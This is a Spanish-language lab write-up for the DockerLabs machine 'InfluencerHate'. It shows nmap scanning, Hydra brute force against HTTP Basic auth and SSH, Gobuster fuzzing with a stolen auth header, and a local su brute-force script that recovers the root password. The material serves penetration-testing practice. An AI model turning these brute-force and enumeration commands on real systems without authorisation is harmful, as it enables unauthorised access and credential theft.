# 🧠 Informe de Pentesting – Máquina: InfluencerHate

### 💡 Dificultad: Fácil

📦 **Plataforma:** DockerLabs

![Despliegue](Imagenes/logo.png)

---

# 🚀 Despliegue de la Máquina

Para iniciar la máquina vulnerable, primero descomprimimos el archivo proporcionado y posteriormente ejecutamos el script de despliegue:

```bash
unzip influencerhate.zip
sudo bash auto_deploy.sh influencerhate.tar
```

Una vez finalizado el proceso, el contenedor vulnerable quedará desplegado dentro de nuestro entorno de laboratorio y listo para comenzar las tareas de reconocimiento y explotación.

![Despliegue](Imagenes/despliegue.png)

---

# 📶 Comprobación de Conectividad

Después del despliegue, verificamos que la máquina objetivo se encuentre activa y responda correctamente a peticiones ICMP:

```bash
ping -c1 172.17.0.2
```

La respuesta recibida confirma que el host está encendido y accesible dentro de la red local del laboratorio.

![Despliegue](Imagenes/ping.png)

---

# 🔍 Escaneo de Puertos

## 🔎 Escaneo Completo de Puertos

El siguiente paso consiste en realizar un escaneo completo sobre todos los puertos TCP con el objetivo de identificar los servicios expuestos por la máquina víctima.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

### Explicación de los parámetros utilizados

| Parámetro         | Descripción                                    |
| ----------------- | ---------------------------------------------- |
| `-p-`             | Escanea los 65535 puertos TCP.                 |
| `--open`          | Muestra únicamente los puertos abiertos.       |
| `-sS`             | Realiza un SYN Scan (escaneo semiabierto).     |
| `--min-rate 5000` | Envía al menos 5000 paquetes por segundo.      |
| `-vvv`            | Incrementa el nivel de verbosidad.             |
| `-n`              | Evita la resolución DNS.                       |
| `-Pn`             | Omite la fase de descubrimiento mediante ping. |

### 📌 Puertos Abiertos Detectados

Durante el análisis se identificaron los siguientes puertos abiertos:

* **22/tcp** → Servicio SSH
* **80/tcp** → Servicio HTTP

![Despliegue](Imagenes/nmapuno.png)

---

## 🧩 Enumeración de Servicios y Versiones

Una vez identificados los puertos abiertos, realizamos una enumeración más detallada para conocer versiones, configuraciones y posibles vectores de ataque.

```bash
nmap -sCV -p22,80,3306 172.17.0.2
```

### Explicación de los parámetros

| Parámetro | Descripción                                |
| --------- | ------------------------------------------ |
| `-sC`     | Ejecuta scripts NSE por defecto.           |
| `-sV`     | Detecta versiones de servicios.            |
| `-p`      | Define los puertos específicos a analizar. |

Este análisis permite recopilar información relevante sobre los servicios activos y posibles configuraciones inseguras.

![Despliegue](Imagenes/nmapdos.png)

---

# 🌐 Análisis de la Aplicación Web

Al identificar la presencia de un servicio HTTP en el puerto 80, accedemos a la página web mediante el navegador.

Durante la inspección inicial observamos un formulario de autenticación aparentemente sencillo.

![Despliegue](Imagenes/nmapdos.png)

Se realizaron diferentes pruebas de enumeración y fuzzing sin obtener resultados relevantes en una primera fase.

Como parte del proceso de análisis, se introdujeron las credenciales por defecto:

```text
admin:admin
```

Posteriormente se interceptó la petición utilizando Burp Suite con el objetivo de analizar el mecanismo de autenticación implementado por la aplicación.

![Despliegue](Imagenes/Burtsuite.png)

Durante la revisión de la petición HTTP se identificó la siguiente cadena:

```text
YWRtaW46YWRtaW4=
```

Al decodificarla utilizando Base64:

```bash
echo 'YWRtaW46YWRtaW4=' | base64 -d
```

Obtuvimos:

```text
admin:admin
```

![Despliegue](Imagenes/base64.png)

Esto permitió confirmar que el sitio estaba utilizando autenticación HTTP Basic, donde las credenciales son transmitidas codificadas en Base64.

---

# 🔓 Ataque de Fuerza Bruta sobre HTTP Basic Authentication

Conociendo el mecanismo de autenticación utilizado por el servidor, se procedió a realizar un ataque de fuerza bruta utilizando Hydra y un diccionario de credenciales por defecto.

Se utilizó el archivo:

```text
Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
```

Disponible en SecLists:

https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt

Comando ejecutado:

```bash
hydra -C ftp-credenciales.txt 172.17.0.2 http-get / -t 64 -I -e nsr
```

### Explicación de los parámetros

| Parámetro  | Descripción                                                      |
| ---------- | ---------------------------------------------------------------- |
| `-C`       | Archivo con pares usuario:contraseña.                            |
| `http-get` | Módulo HTTP GET de Hydra.                                        |
| `-t 64`    | 64 hilos concurrentes.                                           |
| `-I`       | Ignora restauraciones anteriores.                                |
| `-e nsr`   | Prueba credenciales nulas, mismo usuario y contraseña invertida. |

![Despliegue](Imagenes/hydra.png)

Tras varios intentos se obtuvieron las siguientes credenciales válidas:

```text
httpadmin:fhttpadmin
```

Con estas credenciales fue posible acceder correctamente al primer formulario protegido.

---

# 🔎 Nueva Superficie de Ataque

Después de autenticarnos correctamente, la aplicación mostró una nueva interfaz.

![Despliegue](Imagenes/paginados.png)

A continuación se realizó una nueva fase de fuzzing utilizando Gobuster.

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .env,.php,.bak,.old,.zip,.txt -b 403,303,404 --exclude-length 457 -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4="
```

### Explicación del parámetro `-H`

El parámetro:

```bash
-H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4="
```

permite agregar una cabecera HTTP personalizada a todas las peticiones realizadas por Gobuster.

En este caso se envía la cabecera:

```http
Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=
```

la cual contiene las credenciales válidas codificadas en Base64.

De esta manera, Gobuster puede acceder a recursos protegidos por autenticación HTTP Basic y descubrir directorios que normalmente serían inaccesibles para usuarios no autenticados.

Como resultado del escaneo se descubrió el siguiente recurso:

```text
/login.php
```

![Despliegue](Imagenes/gobuster.png)

---

# 🔐 Segundo Formulario de Autenticación

Al acceder al recurso descubierto encontramos un nuevo formulario de login.

![Despliegue](Imagenes/paginatres.png)

Con toda la información obtenida durante la enumeración se desarrolló un script en Python para automatizar ataques de fuerza bruta sobre este formulario.

Utilizando el usuario:

```text
admin
```

se logró identificar la contraseña:

```text
chocolate
```

Además, tras acceder a la aplicación, se obtuvo un posible usuario del sistema:

```text
balutin
```

![Despliegue](Imagenes/loginexito.png)

---

# 🖥️ Acceso Inicial mediante SSH

Con el usuario identificado durante la fase web, se realizó un ataque de fuerza bruta contra el servicio SSH.

```bash
hydra -l balutin -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64 -I
```

Tras completar el ataque se obtuvieron las siguientes credenciales válidas:

```text
balutin:estrella
```

![Despliegue](Imagenes/adminssh.png)

Con estas credenciales se consiguió acceso al sistema mediante SSH.

---

# 📂 Transferencia de Archivos

Durante la fase de post-explotación se decidió transferir el diccionario RockYou al sistema comprometido.

```bash
scp /usr/share/wordlists/rockyou.txt balutin@172.17.0.2:/tmp/
```

El archivo fue copiado correctamente al directorio temporal del sistema.

![Despliegue](Imagenes/archivossh.png)

---

# ⬆️ Escalada de Privilegios

Una vez dentro de la máquina, no se identificaron vectores evidentes de escalada mediante:

```bash
sudo -l
```

ni mediante revisiones habituales de permisos SUID, capacidades o tareas programadas.

Por este motivo se procedió a probar credenciales para el usuario root utilizando un ataque de fuerza bruta local.

Para ello se empleó el siguiente proyecto:

https://github.com/D1se0/suBruteforce/blob/main/suBruteforceBash/suBruteforce.sh

Se copió el contenido del script en un archivo denominado:

```bash
nano suBruteforce.sh
```

Posteriormente se otorgaron permisos de ejecución:

```bash
chmod +x suBruteforce.sh
```

Y finalmente se ejecutó:

```bash
./suBruteforce.sh root rockyou.txt
```

![Despliegue](Imagenes/rootscript.png)

Tras varios intentos, el script consiguió identificar la contraseña del usuario root.

Credenciales encontradas:

```text
root:rockyou
```

---

# 👑 Acceso Root

Utilizando las credenciales obtenidas:

```text
root:rockyou
```

se logró cambiar al usuario root y obtener control total sobre el sistema.

```bash
su root
```

![Despliegue](Imagenes/rootcomplet.png)

